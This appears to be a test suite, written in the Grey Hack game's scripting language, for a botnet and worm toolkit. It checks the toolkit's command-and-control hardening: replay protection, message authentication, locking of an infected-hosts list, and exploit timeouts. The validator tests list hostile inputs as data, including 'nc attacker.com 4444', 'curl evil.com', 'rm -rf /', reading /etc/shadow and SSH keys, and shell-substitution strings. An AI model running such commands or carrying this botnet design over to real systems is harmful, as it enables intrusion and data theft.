// ============================================
// Security Test Suite
// Tests all critical security fixes
// ============================================

import_code("../lib/lib_common.gs")
import_code("../scripts/utils/command_validation.gs")
import_code("../scripts/utils/kyber_transport.gs")
import_code("../scripts/utils/sanitize_ip.gs")

// Test results tracking
TEST_RESULTS = {"passed": 0, "failed": 0, "total": 0}

run_test = function(test_name, test_func)
    TEST_RESULTS.total = TEST_RESULTS.total + 1
    log_master("=== Running Test: " + test_name + " ===", "INFO")
    
    result = test_func()
    if result then
        log_master("✅ PASS: " + test_name, "SUCCESS")
        TEST_RESULTS.passed = TEST_RESULTS.passed + 1
    else
        log_master("❌ FAIL: " + test_name, "ERROR")
        TEST_RESULTS.failed = TEST_RESULTS.failed + 1
    end if
end function

// ============================================
// Test 1: Infected File Locking
// ============================================

test_infected_locking = function()
    comp = get_shell.host_computer
    infected_file = "/root/.botnet/infected.txt"
    lock_file = "/root/.botnet/infected.lock"

    // Clear existing files
    if comp.File(infected_file) then 
        comp.File(infected_file).delete 
    end if
    if comp.File(lock_file) then 
        comp.File(lock_file).delete 
    end if
    
    // Create botnet directory
    comp.create_folder("/root", ".botnet")

    // Simulate multiple concurrent writes
    test_ips = ["192.168.1.10", "192.168.1.11", "192.168.1.12", "192.168.1.13", "192.168.1.14"]
    registered_ips = []

    for ip in test_ips
        // Simulate worm behavior - write to infected list
        current_content = read_file(infected_file)
        if current_content then
            existing_ips = current_content.split(char(10))
        else
            existing_ips = []
        end if
        
        if existing_ips.indexOf(ip) == null then
            existing_ips.push(ip)
            new_content = existing_ips.join(char(10))
            write_file(infected_file, new_content)
        end if
        
        registered_ips.push(ip)
    end for

    // Verify all IPs are registered
    final_content = read_file(infected_file)
    if not final_content then 
        return false
    end if
    
    final_ips = final_content.split(char(10))
    for ip in test_ips
        if final_ips.indexOf(ip) == null then
            log_master("Missing IP: " + ip, "ERROR")
            return false
        end if
    end for
    
    return final_ips.len >= test_ips.len
end function

// ============================================
// Test 2: Ciphertext Validation
// ============================================

test_ciphertext_validation = function()
    // Test: Too short ciphertext
    short_result = decrypt_command("short")
    if short_result != null then
        log_master("Should reject short ciphertext", "ERROR")
        return false
    end if

    // Test: Empty ciphertext
    empty_result = decrypt_command("")
    if empty_result != null then
        log_master("Should reject empty ciphertext", "ERROR")
        return false
    end if

    // Test: Null ciphertext
    null_result = decrypt_command(null)
    if null_result != null then
        log_master("Should reject null ciphertext", "ERROR")
        return false
    end if

    // Test: Non-string type
    type_result = decrypt_command(12345)
    if type_result != null then
        log_master("Should reject non-string ciphertext", "ERROR")
        return false
    end if

    // Test: Extremely large ciphertext (simulated)
    huge_cipher = "A" * 200000
    huge_result = decrypt_command(huge_cipher)
    if huge_result != null then
        log_master("Should reject huge ciphertext", "ERROR")
        return false
    end if

    return true
end function

// ============================================
// Test 3: Replay Protection
// ============================================

test_replay_protection = function()
    // Generate a test command with timestamp and nonce
    test_time = time
    test_nonce = "test_nonce_12345"
    test_cmd = "run /bin/slave.gs"
    cmd_with_meta = str(test_time) + ":" + test_nonce + ":" + test_cmd

    // First validation should succeed
    first_result = validate_command_with_replay_protection(cmd_with_meta)
    if first_result != test_cmd then
        log_master("First validation failed", "ERROR")
        return false
    end if

    // Second validation (replay) should fail
    second_result = validate_command_with_replay_protection(cmd_with_meta)
    if second_result != null then
        log_master("Replay attack not detected", "ERROR")
        return false
    end if

    // Test old timestamp rejection
    old_time = time - 400  // 400 seconds ago (older than 300s limit)
    old_cmd = str(old_time) + ":" + "old_nonce" + ":" + test_cmd
    old_result = validate_command_with_replay_protection(old_cmd)
    if old_result != null then
        log_master("Old timestamp not rejected", "ERROR")
        return false
    end if

    // Test future timestamp rejection
    future_time = time + 100  // 100 seconds in future (beyond 30s tolerance)
    future_cmd = str(future_time) + ":" + "future_nonce" + ":" + test_cmd
    future_result = validate_command_with_replay_protection(future_cmd)
    if future_result != null then
        log_master("Future timestamp not rejected", "ERROR")
        return false
    end if

    return true
end function

// ============================================
// Test 4: Path Traversal Protection
// ============================================

test_path_traversal = function()
    // These should all be rejected
    dangerous_paths = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "/root/.botnet-evil/file",
        "/scripts/utilities/file",  // False positive test
        "/tmp/../../../etc/passwd",
        "~/.ssh/id_rsa",
        "$HOME/.ssh/id_rsa",
        "`whoami`",
        "/root/.botnet/../../../etc/passwd"
    ]

    for path in dangerous_paths
        if safe_path(path) then
            log_master("Dangerous path accepted: " + path, "ERROR")
            return false
        end if
    end for

    // These should be accepted
    safe_paths = [
        "/root/.botnet/config.txt",
        "/scripts/utils/accessLevel.gs",
        "/bin/slave.gs",
        "/lib/kyber_lib.gs",
        "/tmp/temp_file"
    ]

    for path in safe_paths
        if not safe_path(path) then
            log_master("Safe path rejected: " + path, "ERROR")
            return false
        end if
    end for

    return true
end function

// ============================================
// Test 5: Command Injection Protection
// ============================================

test_command_injection = function()
    // Test that dangerous characters in paths are rejected
    dangerous_commands = [
        "run /bin/slave.gs; rm -rf /",
        "run /bin/slave.gs | nc attacker.com 4444",
        "run /bin/slave.gs && curl evil.com",
        "run `/bin/sh`",
        "run $(whoami)",
        "read /etc/passwd; cat /etc/shadow"
    ]

    for cmd in dangerous_commands
        if validate_command(cmd) then
            log_master("Dangerous command accepted: " + cmd, "ERROR")
            return false
        end if
    end for

    // Test that safe commands are accepted
    safe_commands = [
        "run /bin/slave.gs",
        "status",
        "clean",
        "read /root/.botnet/config.txt",
        "worm 3 192.168.1.100"
    ]

    for cmd in safe_commands
        if not validate_command(cmd) then
            log_master("Safe command rejected: " + cmd, "ERROR")
            return false
        end if
    end for

    return true
end function

// ============================================
// Test 6: Depth Marker Encryption
// ============================================

test_depth_marker_encryption = function()
    // This test requires the master's private key to verify encryption
    // For now, test that depth markers are created with .enc extension
    
    comp = get_shell.host_computer
    depth_dir = "/root/.botnet/depth_markers"
    
    if not comp.File(depth_dir) then
        comp.create_folder("/root/.botnet", "depth_markers")
    end if

    test_ip = "192.168.1.100"
    test_depth = 3
    
    // Simulate depth marker creation (simplified test)
    marker_name = test_ip.replace(".", "_") + ".enc"
    marker_path = depth_dir + "/" + marker_name
    
    // Create a test encrypted marker
    test_content = "encrypted_depth_data"
    if not write_file(marker_path, test_content) then
        log_master("Failed to create depth marker", "ERROR")
        return false
    end if

    // Verify marker exists and has .enc extension
    marker_file = comp.File(marker_path)
    if not marker_file then
        log_master("Depth marker file not found", "ERROR")
        return false
    end if

    if marker_file.name[-4:] != ".enc" then
        log_master("Depth marker not encrypted (no .enc extension)", "ERROR")
        return false
    end if

    // Cleanup
    marker_file.delete
    return true
end function

// ============================================
// Test 7: Message Authentication
// ============================================

test_message_authentication = function()
    // Test authentication tag generation
    test_cmd = "run /bin/slave.gs"
    test_auth_key = "test_auth_key_123"
    
    auth_tag = authenticate_command(test_cmd, test_auth_key)
    if auth_tag == null or auth_tag == "" then
        log_master("Failed to generate auth tag", "ERROR")
        return false
    end if

    // Test verification with correct key
    if not verify_command_authenticity(test_cmd, auth_tag, test_auth_key) then
        log_master("Failed to verify authentic command", "ERROR")
        return false
    end if

    // Test verification with wrong key
    if verify_command_authenticity(test_cmd, auth_tag, "wrong_key") then
        log_master("Accepted command with wrong auth key", "ERROR")
        return false
    end if

    // Test verification with tampered command
    if verify_command_authenticity("tampered_command", auth_tag, test_auth_key) then
        log_master("Accepted tampered command", "ERROR")
        return false
    end if

    return true
end function

// ============================================
// Test 8: AccessLevel Cleanup
// ============================================

test_accesslevel_cleanup = function()
    comp = get_shell.host_computer
    
    // Count files in /root before test
    root_dir = comp.File("/root")
    if not root_dir then 
        return false
    end if
    
    files_before = root_dir.get_files
    count_before = 0
    if files_before then
        count_before = files_before.len
    end if

    // Run accessLevel test (should create and delete test file)
    test_result = accessLevel(comp)
    
    // Count files in /root after test
    files_after = root_dir.get_files
    count_after = 0
    if files_after then
        count_after = files_after.len
    end if

    // Should have same number of files (test file cleaned up)
    if count_after != count_before then
        log_master("Test file not cleaned up. Files before: " + str(count_before) + ", after: " + str(count_after), "ERROR")
        return false
    end if

    return true
end function

// ============================================
// Test 9: Command Injection in deploy_to_target()
// ============================================

test_deploy_command_injection = function()
    // Mock a shell object that detects command injection
    mock_shell = @{}
    mock_shell.host_computer = get_shell.host_computer
    mock_shell.run = function(cmd)
        // Check if cmd contains unquoted dangerous characters
        if cmd.indexOf(";") != null or cmd.indexOf("|") != null or cmd.indexOf("&") != null then
            log_master("FAIL: Command injection possible: " + cmd, "ERROR")
            return "INJECTED"
        end if
        return ""
    end function
    mock_shell.launch = function(script, args) 
        return true 
    end function

    // Test with malicious filename that should be properly quoted
    comp = get_shell.host_computer
    
    // Create test environment
    if not comp.File("/root/.botnet") then
        comp.create_folder("/root", ".botnet")
    end if
    
    // Create a fake master pubkey for test
    master_pub_content = "test_master_pub_key"
    if not write_file("/root/.botnet/master.pub", master_pub_content) then
        log_master("Failed to create test master pubkey", "ERROR")
        return false
    end if

    // This should NOT execute malicious command due to proper quoting
    result = deploy_to_target(mock_shell, "192.168.1.1", 0)
    if result == "INJECTED" then
        log_master("FAIL: Command injection was not prevented", "ERROR")
        return false
    end if
    
    // Cleanup
    if comp.File("/root/.botnet/master.pub") then
        comp.File("/root/.botnet/master.pub").delete
    end if
    
    return true
end function

// ============================================
// Test 10: TOCTOU in lock_infected()
// ============================================

test_lock_touctou = function()
    comp = get_shell.host_computer
    lock_path = "/root/.botnet/test.lock"
    
    // Clear any existing test lock
    if comp.File(lock_path) then 
        comp.File(lock_path).delete 
    end if
    
    // Create botnet directory if needed
    if not comp.File("/root/.botnet") then
        comp.create_folder("/root", ".botnet")
    end if

    // Simulate 10 concurrent lock attempts
    successes = 0
    for i in range(0, 9)
        if lock_infected() then
            successes = successes + 1
            unlock_infected()
        end if
    end for

    // Only 1 should succeed (atomic lock)
    if successes != 1 then
        log_master("FAIL: Expected 1 successful lock, got " + str(successes), "ERROR")
        return false
    end if
    
    // Cleanup
    if comp.File(lock_path) then 
        comp.File(lock_path).delete 
    end if
    
    return true
end function

// ============================================
// Test 11: Plaintext Depth Marker Fallback
// ============================================

test_depth_marker_fallback = function()
    comp = get_shell.host_computer
    
    // Create test environment
    if not comp.File("/root/.botnet") then
        comp.create_folder("/root", ".botnet")
    end if
    if not comp.File("/root/.botnet/depth_markers") then
        comp.create_folder("/root/.botnet", "depth_markers")
    end if
    
    // Backup and temporarily hide master pubkey
    master_pub_backup = read_file("/root/.botnet/master.pub")
    if master_pub_backup then
        comp.File("/root/.botnet/master.pub").delete
    end if

    // This should FAIL (not fall back to plaintext)
    result = store_depth_marker("192.168.1.1", 3)
    if result then
        log_master("FAIL: Plaintext depth marker was allowed", "ERROR")
        // Restore master pubkey
        if master_pub_backup then
            write_file("/root/.botnet/master.pub", master_pub_backup)
        end if
        return false
    end if

    // Restore master pubkey
    if master_pub_backup then
        write_file("/root/.botnet/master.pub", master_pub_backup)
    end if
    
    return true
end function

// ============================================
// Test 12: Integration Testing - Worm Propagation
// ============================================

test_worm_propagation_integration = function()
    comp = get_shell.host_computer
    
    // Create test environment
    if not comp.File("/root/.botnet") then
        comp.create_folder("/root", ".botnet")
    end if
    
    // Create test infected list with multiple IPs
    test_ips = ["192.168.1.10", "192.168.1.11", "192.168.1.12", "192.168.1.13", "192.168.1.14",
                "192.168.1.15", "192.168.1.16", "192.168.1.17", "192.168.1.18", "192.168.1.19"]
    
    infected_content = test_ips.join(char(10))
    if not write_file("/root/.botnet/infected.txt", infected_content) then
        log_master("Failed to create test infected list", "ERROR")
        return false
    end if
    
    // Test concurrent access to infected list
    concurrent_successes = 0
    for i in range(0, 9)
        if lock_infected() then
            // Simulate adding a new IP
            current_content = read_file("/root/.botnet/infected.txt")
            if current_content then
                new_ip = "192.168.1." + str(20 + i)
                updated_content = current_content + char(10) + new_ip
                if write_file("/root/.botnet/infected.txt", updated_content) then
                    concurrent_successes = concurrent_successes + 1
                end if
            end if
            unlock_infected()
        end if
    end for
    
    // Verify no race conditions occurred
    final_content = read_file("/root/.botnet/infected.txt")
    if not final_content then
        log_master("Failed to read final infected list", "ERROR")
        return false
    end if
    
    final_ips = final_content.split(char(10))
    unique_ips = []
    for ip in final_ips
        if ip and ip.len > 0 and unique_ips.indexOf(ip) == null then
            unique_ips.push(ip)
        end if
    end for
    
    // Should have original 10 + concurrent_successes unique IPs
    expected_count = 10 + concurrent_successes
    if unique_ips.len != expected_count then
        log_master("Race condition detected. Expected " + str(expected_count) + ", got " + str(unique_ips.len), "ERROR")
        return false
    end if
    
    // Cleanup
    if comp.File("/root/.botnet/infected.txt") then
        comp.File("/root/.botnet/infected.txt").delete
    end if
    
    return true
end function

// ============================================
// Test 13: Fuzz Testing - Malformed IPs
// ============================================

test_malformed_ip_fuzzing = function()
    // Test various malformed IP inputs
    malformed_ips = [
        "",
        null,
        "not.an.ip",
        "999.999.999.999",
        "192.168.1",
        "192.168.1.256",
        "192.168.1.1.1",
        "../../../etc/passwd",
        "192.168.1.1; rm -rf /",
        "192.168.1.1|whoami",
        "192.168.1.1&&curl evil.com",
        "`whoami`",
        "$(whoami)",
        "192.168.1.1 > /tmp/pwned",
        "x" * 1000,  // Very long string
        "192.168.1.1\n\r\t",
        " 192.168.1.1 ",  // With spaces
        "192.168.1.1#comment"
    ]
    
    for malformed_ip in malformed_ips
        // Test that malformed IPs don't cause crashes
        // Test sanitize_ip function
        sanitized = sanitize_ip(malformed_ip)
        if sanitized and sanitized.len > 0 then
            // If sanitized, should be valid
            if not is_valid_ip(sanitized) then
                log_master("FAIL: Sanitized IP still invalid: " + str(malformed_ip) + " -> " + sanitized, "ERROR")
                return false
            end if
        end if
        
        // Test is_valid_ip function directly
        if is_valid_ip(malformed_ip) then
            log_master("FAIL: Invalid IP accepted as valid: " + str(malformed_ip), "ERROR")
            return false
        end if
    end for
    
    return true
end function

// ============================================
// Test 14: Stress Testing - Unresponsive Targets
// ============================================

test_unresponsive_targets_stress = function()
    // Mock metaxploit that simulates unresponsive targets
    original_metaxploit = get_metaxploit
    
    mock_metaxploit = @{}
    mock_metaxploit.net_use = function(ip, port)
        // Simulate timeout by waiting longer than CONNECTION_TIMEOUT
        wait(15)  // Longer than 10s timeout
        return null
    end function
    mock_metaxploit.scan = function(lib)
        return []
    end function
    mock_metaxploit.scan_address = function(lib, addr)
        return null
    end function
    
    // Override get_metaxploit temporarily
    get_metaxploit = function()
        return mock_metaxploit
    end function
    
    start_time = time
    
    // Test with multiple unresponsive targets
    test_ips = ["192.168.1.100", "192.168.1.101", "192.168.1.102"]
    for ip in test_ips
        result = exploit_target(ip)
        // Should return null due to timeout
        if result != null then
            log_master("FAIL: Unresponsive target should return null: " + ip, "ERROR")
            // Restore original function
            get_metaxploit = original_metaxploit
            return false
        end if
    end for
    
    elapsed_time = time - start_time
    
    // Should complete quickly due to timeouts (not 45+ seconds)
    if elapsed_time > 30 then
        log_master("FAIL: Stress test took too long: " + str(elapsed_time) + "s", "ERROR")
        // Restore original function
        get_metaxploit = original_metaxploit
        return false
    end if
    
    // Restore original function
    get_metaxploit = original_metaxploit
    
    return true
end function

// ============================================
// Run All Tests
// ============================================

run_all_tests = function()
    log_master("Starting Security Test Suite...", "INFO")
    log_master("================================", "INFO")

    // Reset counters
    TEST_RESULTS.passed = 0
    TEST_RESULTS.failed = 0
    TEST_RESULTS.total = 0

    // Run all tests
    run_test("Infected File Locking", test_infected_locking)
    run_test("Ciphertext Validation", test_ciphertext_validation)
    run_test("Replay Protection", test_replay_protection)
    run_test("Path Traversal Protection", test_path_traversal)
    run_test("Command Injection Protection", test_command_injection)
    run_test("Depth Marker Encryption", test_depth_marker_encryption)
    run_test("Message Authentication", test_message_authentication)
    run_test("AccessLevel Cleanup", test_accesslevel_cleanup)
    
    // New critical security tests
    run_test("Command Injection in deploy_to_target()", test_deploy_command_injection)
    run_test("TOCTOU in lock_infected()", test_lock_touctou)
    run_test("Plaintext Depth Marker Fallback", test_depth_marker_fallback)
    run_test("Integration Testing - Worm Propagation", test_worm_propagation_integration)
    run_test("Fuzz Testing - Malformed IPs", test_malformed_ip_fuzzing)
    run_test("Stress Testing - Unresponsive Targets", test_unresponsive_targets_stress)

    // Print results
    log_master("================================", "INFO")
    log_master("Test Results Summary:", "INFO")
    log_master("Total Tests: " + str(TEST_RESULTS.total), "INFO")
    log_master("Passed: " + str(TEST_RESULTS.passed), "SUCCESS")
    log_master("Failed: " + str(TEST_RESULTS.failed), "ERROR")
    
    if TEST_RESULTS.failed == 0 then
        log_master("🎉 ALL TESTS PASSED!", "SUCCESS")
        return true
    else
        log_master("❌ SOME TESTS FAILED", "ERROR")
        return false
    end if
end function

// Auto-run if executed directly
if params.len == 0 then
    run_all_tests()
end if
